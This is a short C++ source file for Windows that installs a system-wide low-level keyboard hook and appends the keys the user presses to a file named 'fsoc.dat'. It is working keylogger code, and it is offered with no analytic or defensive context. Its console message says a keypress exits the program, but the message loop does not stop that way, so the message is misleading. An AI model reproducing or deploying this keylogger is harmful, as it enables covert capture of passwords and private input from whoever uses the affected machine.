#include <iostream>
#include <fstream>
#include <Windows.h>

// Global hook handle
HHOOK hookHandle;

// File for logging key strikes
std::ofstream logfile("fsoc.dat", std::ios::app); // Append mode

// Keyboard hook procedure
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
            char key = MapVirtualKey(kbStruct->vkCode, 2); // Convert virtual key code to character

            // Check if the key is a letter, number, or special character
            if ((key >= 'A' && key <= 'Z') || (key >= 'a' && key <= 'z') || (key >= '0' && key <= '9') || key < 32) {
                // Log the simplified key
                logfile << "Key pressed: " << key << std::endl;
            }
        }
    }
    // Pass control to the next hook
    return CallNextHookEx(hookHandle, nCode, wParam, lParam);
}

int main() {
    // Set the hook
    hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);

    if (hookHandle == NULL) {
        std::cerr << "Failed to set hook." << std::endl;
        return 1;
    }

    std::cout << "Keyboard hook is active. Press any key to exit." << std::endl;

    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        // Process messages
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Unhook the keyboard hook
    UnhookWindowsHookEx(hookHandle);

    // Close the log file
    logfile.close();

    return 0;
}
